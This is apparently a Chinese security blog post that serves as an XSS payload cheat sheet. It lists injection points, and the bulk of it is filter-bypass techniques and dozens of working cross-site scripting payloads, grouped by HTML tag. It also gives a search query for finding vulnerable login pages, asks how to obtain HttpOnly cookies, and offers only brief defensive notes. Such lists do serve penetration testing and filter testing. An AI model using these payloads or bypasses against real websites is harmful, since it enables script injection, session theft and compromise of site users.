---
layout: post
title: XSS Tricks And Others
categories: 安全工程师 
kerywords: XSS Web安全
tags: XSS
---

# 输入输出在哪里

* 在属性里
>
```
formaction action href xlink:href autofocus src content data
```

* 在标签里
> 
```
<script> <a> <p> <img> <body> <button> <var> <div> <iframe> <object> <input> <select> <textarea> <keygen> <frameset> <embed> <svg> <math> <video> <audio>　
```
>>　没有标签制造标签也要上

* 在事件上
> 
```
onload onunload onchange onsubmit onreset onselect onblur onfocus onabort onkeydown onkeypress onkeyup onclick ondbclick onmouseover onmousemove onmouseout onmouseup onforminput onformchange ondrag ondrop onshow onwheel
```


# XSS技巧

* 标签和属性之间不一定只出现空格
> `<img/src=x onerror=alert(1)>` 有些情况下我们可以使用"/"来代替空格


* href当中使用javascript或者data URI 
>
```
<a href=javascript:alert(2)>M 
<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg==>

```

* 编码
> * 对百分号二次编码
> * Base64 编码绕过
> * HTTP 实体编码绕过
>> `<a href=javascript&colon;confirm(2)>M`
> * \x十六进制，八进制,hex,demical
> * Unicode码
> * urlencode

```
<a href= 'javascript:alert&#40;&#39;123&#39;&#41; '>Hello</a>

<a href= "j&#97;vascript:alert&#40; '123' &#41;">Hello</a >

<a  href=  "j&#97;vascript:alert&#0000040;  '123' &#41;">Hello</a >

<a  href=  "j&#97vascript:alert&#0000040'123' &#41">Hello</a >

<a href=data:text/html;%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2829%29%3C%2F%73%63%72%69%70%74%3E>M 

<a href=j&#x61;v&#97script&#x3A;&#97lert(13)>M

```


> eval 认识\x十六进制，八进制，Unicode码

* CSS表达式

* 转义字符

* URL 中有可自定义的控制的前端编码

* 宽字节绕过

* 头部base绕过

* Referer为空时才可以访问(有一些界面为了避免是从别的地方跳转过来的，就需要referer为空)
> `HTTPS -> HTTP`
> `<meta name="referrer" content="never" >`

* 注意返回的type类型
> 返回的type类型是xml和html时，才可能执行

* 阻止浏览器302跳转

* 头部X-XSS-Protection

* 大小写绕过

* 标签绕过

* 闭合标签


#### 哪些标签(本节直接摘自P神博客，原文链接在文末)
* a 标签的xlink
> 
```
<svg><a xlink:href="javascript:alert(1)"><rect width="1000" height="1000" fill="white"/>不要点我</a></svg> 
<math><a xlink:href=javascript:alert(1)>M
```

* script 标签
> 
```
<script>alert((+[][+[]]+[])[++[[]][+[]]]+([![]]+[])[++[++[[]][+[]]][+[]]]+([!![]]+[])[++[++[++[[]][+[]]][+[]]][+[]]]+([!![]]+[])[++[[]][+[]]]+([!![]]+[])[+[]])</script> //想玩这个，可以在这里转换你的编码 http://www.jsfuck.com/ 

<script firefox>alert(1)</script>  //其实我们并不需要一个规范的script标签 

<script>~'\u0061' ;  \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073.  \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script> // 

<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script>//在这里我们依然可以使用那些编码 

<script>prompt(-[])</script> //不只是alert。prompt和confirm也可以弹窗 

<script>alert(/3/)</script> //可以用"/"来代替单引号和双引号 

<script>alert(String.fromCharCode(49))</script> //我们还可以用char 

<script>alert(/7/.source)</script> // ".source"不会影响alert(7)的执行 

<script>setTimeout('alert(1)',0)</script> //如果输出是在setTimeout里，我们依然可以直接执行alert(1)

```

* Button 标签
> 
```
<form><button formaction=javascript&colon;alert(1)>M
<button onfocus=alert(1) autofocus>

``` 

* p标签
> 如果你发现变量输出在了p标签里，先不要急着从标签跳出去，因为只要你能跳出""就已经足够了。
`<p/onmouseover=javascript:alert(1); >M</p> `

* img标签 
> img标签没有什么好讲的了。不过值得注意的是，有些姿势是因浏览器不通而不能成功的执行的。所以在空闲时间对payload进行分类，做上可执行浏览器的注释来提高你挖掘XSS的效率。

```
<img src=x onerror=alert(1)> 
<img src ?itworksonchrome?\/onerror = alert(1)>  //只在chrome下有效 
<img src=x onerror=window.open('http://google.com');> 
<img/src/onerror=alert(1)>  //只在chrome下有效 
<img src="x:kcf" onerror="alert(1)">
```

* body标签 
> 没有什么特别之处，都是通过event来调用js 

```
<body onload=alert(1)> 
<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus> 

```

* var标签
> `<var onmouseover="prompt(1)">KCF</var>`

* div标签
> 
```
<div/onmouseover='alert(1)'>X 
<div style="position:absolute;top:0;left:0;width:100%;height:100%" onclick="alert(52)">
```

* iframe标签
> iframe这个例子当中值得一提的是，有时候我们可以通过实体编码&NewLine;&Tab（换行和tab字符）来bypass一些filter。我们还可以通过事先在swf文件中插入我们的xss code,然后通过src属性来调用。不过关于flash值得一提的是，只有在crossdomain.xml文件中，allow-access-from domain=“*"允许从外部调用swf时，我们才可以通过flash来实现xss attack.

> 
```
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>   把javascript代码每个字符每隔一定的TAB分开

<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe> 

<iframe SRC="http://0x.lv/xss.swf"></iframe> 

<IFRAME SRC="javascript:alert(1);"></IFRAME> 

<iframe/onload=alert(53)></iframe>

```

* meta标签
> 很多时候，在做xss测试时，你会发现你的昵称，文章标题跑到meta标签里。那么你只需要跳出当前属性再添加http-equiv="refresh",就可以构造一个有效的xss payload了。当然一些猥琐流的玩法，会通过给http-equiv设置set-cookie来，进一步重新设置cookie来干一些猥琐的事情 

> 
```
<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>? 
<meta http-equiv="refresh" content="0; url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E">

```

* object标签
> 和a标签的href属性玩法是一样的，不过优点是无须交互。
> `<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4=></object>`

* marquee标签
> `<marquee  onstart="alert('sometext')"></marquee>`

* isindex标签
> 第二个例子，值得我们注意一的是在一些只针对属性做了过滤的webapp当中，action很可能就是漏网之鱼。
> 
```
<isindex type=image src=1 onerror=alert(1)> 
<isindex action=javascript:alert(1) type=image>
```

* input标签 
> 没有什么特别之处，通过event来调用js。和之前的button的例子一样通过 autofocus来达到无须交互即可弹窗的效果。在这里使用到了onblur是希望大家学会举一反三。
> 
```
<input onfocus=javascript:alert(1) autofocus> 
<input onblur=javascript:alert(1) autofocus><input autofocus>
```

* select标签
> `<select onfocus=javascript:alert(1) autofocus>`

* textarea标签
> `<textarea onfocus=javascript:alert(1) autofocus>`

* keygen标签
> `<keygen onfocus=javascript:alert(1) autofocus>`

* frameset标签
> 
```
<FRAMESET><FRAME SRC="javascript:alert(1);"></FRAMESET> 
<frameset onload=alert(1)>
```

* embed标签
> 
```
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4="></embed> //chrome 
<embed src=javascript:alert(1)> //firefox
```

* svg标签
>
```
<svg onload="javascript:alert(1)" xmlns="http://www.w3.org/2000/svg"></svg> 
<svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(1)"></g></svg>  //chrome有效
```

* math标签
>
```
<math href="javascript:javascript:alert(1)">CLICKME</math> 
<math><y/xlink:href=javascript:alert(51)>test1 
<math> <maction actiontype="statusline#http://wangnima.com" 
xlink:href="javascript:alert(49)">CLICKME</maction> </math>

```

* video标签
>
```
<video><source onerror="alert(1)"> 
<video src=x onerror=alert(48)>
```

* audio标签
>
```
<audio src=x onerror=alert(47)>
```
姿势的介绍就在这里结束了。
说句题外话 在这些标签里面凡是出现在on*事件值里面的javascript:都是多余的。但是这个对测试者来说是很方便的。因为你可以通过一个payload来测试好几个黑名单成员


# 示例

```

什么都不过滤

<HTML 标签 onXXXX="...[输出在这里].."> 

<a href="javascript:[输出在这里]">xxxx </a>

<script>[输出在这里]</script>

```
> 例如Dkey的用户登录界面和密码找回界面．Google搜索即可测试 `inurl:"webAuth" DKey`


> onclick,  onerror, onload
```
<img src="#" onclick="javascript:alert('img:onclick')" onerror="javascript:alert('img:onerror')" onload="javascript:alert('img:onload')">

<!–src加伪协议js代码不能触发–>

<video src="#" onclick="javascript:alert('video:onclick')" onerror="javascript:alert('video:onerror')" onload="javascript:alert('video:onload')"></video>

<audio src="#" onclick="javascript:alert('audio:onclick')" onerror="javascript:alert('audio:onerror')" onload="javascript:alert('audio:onload')"></audio>

```


```
<iframe src="javascript:alert('iframe')" width= "0" height= "0"/>

<form action= "Javascript:alert('from_action0')">

<input type= "submit" formaction=" JaVaScript:alert('from_action2')">

<input type= "image" formaction=" JaVaScript:alert('from_action1')">

<input type ="text" onchange ="JaVaScript:alert('from_action3')"> 

```

```

<a onmouseover= "javascript:alert('a_onmouseover')">12</ a>

<svg onload=" javascript:alert('svg')"></svg >

<body onload= "javascript:alert('body')"></body>

<select autofocus onfocus="javascript:alert('select' )"></select>

<textarea autofocus onfocus="javascript:alert('textarea' )"></textarea>

<keygen autofocus onfocus="javascript:alert('keygen' )"></keygen>

<audio><source onerror="javascript:alert('source')"></ audio>
```


# XSS自动生成
* Keras 
* Darknet

使用过Darknet 自带的生成模型直接，Keras的话也可以，修改下xss payloads的格式即可生成，但是质量不是很高，只能觉得很炫。之前了解了下GAN的原理，但是数学公式那里还没有细看，暂时放在此处，理论上来说，任何修改成该样式的皆可。但是判别模型是不是需要进一步有所处理，暂时不知道。


# 自动化XSS工具
pass 
> 暂且搁置，刚开始写，在没有系统化本文章之前，觉得花个一周xss的自动工具，但是看完之后。。。还是再看看xsstrike的源码再继续。

# 检测XSS/XSS检测，保护？

* 传统的话我不是很清楚,估计规则和黑白名单同样适用的。机器学习的话，贝叶斯分类啊，cnn都很好，简直是万能的文本分类模型吧
* 过滤字符串，但是过滤是过滤不完的，看看prompt.ml上的闯关题目就知道了，不同过滤总有绕过
* http-only一定程度上避免盗取cookie
* 永远不要信任用户的任何输入，前后端一定要做过滤

# 问题

* 怎么得到HTTP-ONLY的Cookie?
> 安装Chrome插件进行获取
* 如何持久化以及利用持久化进行后渗透?

* beef的js是怎么生成的?


# References
* [那些年的XSS](https://wizardforcel.gitbooks.io/xss-naxienian/content/0.html)
* [挖洞经验 | 可以被XSS利用的HTML标签和一些手段技巧](http://www.freebuf.com/articles/web/157589.html)
* [XSS 绕过 WAF](http://www.freebuf.com/articles/web/81959.html)
* [那些年我们没能bypass的xss filter[from wooyun]](https://www.leavesongs.com/PENETRATION/xss-collect.html)
* [HTML5SEC](https://raw.githubusercontent.com/cure53/H5SC/master/vectors.txt)
* [XSS PAYLOADS](https://gist.github.com/tennc/4026cfd0925aaad0a655)